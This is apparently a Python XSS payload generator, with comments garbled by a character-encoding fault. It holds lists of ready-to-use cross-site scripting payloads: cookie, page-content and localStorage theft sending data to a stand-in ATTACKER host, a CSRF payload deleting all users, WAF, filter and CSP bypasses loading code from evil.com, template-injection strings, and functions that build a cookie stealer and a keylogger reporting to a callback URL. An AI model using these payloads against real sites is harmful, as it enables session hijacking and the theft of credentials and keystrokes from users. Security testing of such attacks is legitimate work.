"""XSS (Cross-Site Scripting) Payload çæå¨.

è¦ç:
    - åå°å XSS æ£æµ & å©ç¨
    - DOM XSS
    - WAF / è¿æ»¤ç»è¿
    - Cookie çªå
    - CSP ç»è¿
"""
from typing import List, Dict


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  æ£æµ Payload
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

DETECTION: List[str] = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<video><source onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "\"'><script>alert(1)</script>",
    "javascript:alert(1)",
    "'-alert(1)-'",
    "\";alert(1)//",
    "<a href=javascript:alert(1)>click</a>",
    "<iframe src=javascript:alert(1)>",
]


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  Cookie çªå / æ°æ®å¤ä¼ 
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

EXFILTRATION: List[Dict[str, str]] = [
    {
        "name": "Cookie çªå (Image)",
        "payload": "<img src=x onerror=\"this.src='http://ATTACKER/?c='+document.cookie\">",
    },
    {
        "name": "Cookie çªå (fetch)",
        "payload": "<script>fetch('http://ATTACKER/?c='+document.cookie)</script>",
    },
    {
        "name": "Cookie çªå (new Image)",
        "payload": "<script>new Image().src='http://ATTACKER/?c='+document.cookie</script>",
    },
    {
        "name": "é¡µé¢åå®¹çªå",
        "payload": "<script>fetch('http://ATTACKER/?d='+btoa(document.body.innerHTML))</script>",
    },
    {
        "name": "LocalStorage çªå",
        "payload": "<script>for(k in localStorage){new Image().src='http://ATTACKER/?k='+k+'&v='+localStorage[k]}</script>",
    },
    {
        "name": "CSRF + XSS ç»å",
        "payload": "<script>\nfetch('/admin/delete?user=all',{method:'POST',credentials:'include'})\n</script>",
    },
]


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  WAF / è¿æ»¤ç»è¿
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

BYPASS: Dict[str, List[str]] = {
    "æ ç­¾åç»è¿": [
        "<ScRiPt>alert(1)</ScRiPt>",                     # å¤§å°åæ··å
        "<scr<script>ipt>alert(1)</scr</script>ipt>",     # æ ç­¾åµå¥
        "<scr\x00ipt>alert(1)</scr\x00ipt>",              # NULL å­è
        "<%73cript>alert(1)</%73cript>",                  # HTML ç¼ç 
    ],
    "äºä»¶å¤çå¨ç»è¿": [
        "<img src=x onerror=alert(1)>",                   # ç»å¸
        "<img src=1 onerror=alert(1)>",                   # æ æsrc
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", # base64 ç¼ç 
        "<img src=x onerror=window['al'+'ert'](1)>",     # å­ç¬¦ä¸²æ¼æ¥
        "<img src=x oneonerrorror=alert(1)>",            # ååç»è¿
    ],
    "alert è¿æ»¤ç»è¿": [
        "<script>prompt(1)</script>",                     # prompt æ¿ä»£
        "<script>confirm(1)</script>",                    # confirm æ¿ä»£
        "<script>top['al'+'ert'](1)</script>",           # å­ç¬¦ä¸²æ¼æ¥
        "<script>(alert)(1)</script>",                    # æ¬å·ç»è¿
        "<script>throw 1</script>",                       # throw æ¿ä»£
        "<script>console.log(1)</script>",                # console.log
    ],
    "æ¬å·è¿æ»¤ç»è¿": [
        "<script>alert`1`</script>",                      # æ¨¡æ¿å­ç¬¦ä¸²
        "<script>setTimeout`alert\\x281\\x29`</script>",  # setTimeout
        "<img src=x onerror=alert`1`>",                   # ES6 æ¨¡æ¿
        "<script>onerror=alert;throw 1</script>",          # throw
    ],
    "å¼å·è¿æ»¤ç»è¿": [
        "<img src=x onerror=alert(String.fromCharCode(49))>",
        "<script>eval(/\\x61lert(1)/.source)</script>",   # æ­£åç»è¿
        '<img src=x onerror=alert(1)>',                    # æ å¼å·
    ],
    "ç©ºæ ¼è¿æ»¤ç»è¿": [
        "<img/src=x/onerror=alert(1)>",                   # ææ æ¿ä»£
        "<svg/onload=alert(1)>",                           # èªé­å
        "<img%0asrc=x%0aonerror=alert(1)>",               # %0a æ¿ä»£
        "<img%0dsrc=x%0donerror=alert(1)>",               # %0d æ¿ä»£
        "<img%09src=x%09onerror=alert(1)>",               # %09 tab
    ],
    "CSP ç»è¿": [
        "<script src='http://evil.com/payload.js'></script>",  # éè¦ CSP åè®¸
        "<link rel=stylesheet href='http://evil.com/exfil.css'>",  # CSS å¤ä¼ 
        "<base href='http://evil.com/'>",                   # base å«æ
        "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
    ],
    "AngularJS / Vue ç»è¿": [
        "{{constructor.constructor('alert(1)')()}}",       # Angular
        "{{$on.constructor('alert(1)')()}}",               # Angular
        "{{_openBlock.constructor('alert(1)')()}}",         # Vue
    ],
}


def get_detection() -> List[str]:
    """è·å XSS æ£æµ Payload."""
    return DETECTION


def get_exfiltration() -> list:
    """è·åæ°æ®å¤ä¼  Payload."""
    return EXFILTRATION


def get_bypass(category: str = "") -> dict:
    """è·å WAF ç»è¿ Payload."""
    if category and category in BYPASS:
        return {category: BYPASS[category]}
    return BYPASS


def generate_cookie_stealer(callback_url: str) -> str:
    """çæ Cookie çªå Payload.

    Args:
        callback_url: æ¥æ¶ Cookie ç URL
    """
    return f"<script>new Image().src='{callback_url}?c='+document.cookie</script>"


def generate_keylogger(callback_url: str) -> str:
    """çæé®çè®°å½ Payload.

    Args:
        callback_url: æ¥æ¶æé®è®°å½ç URL
    """
    return f"""<script>
document.onkeypress=function(e){{
  fetch('{callback_url}?k='+e.key)
}}
</script>"""
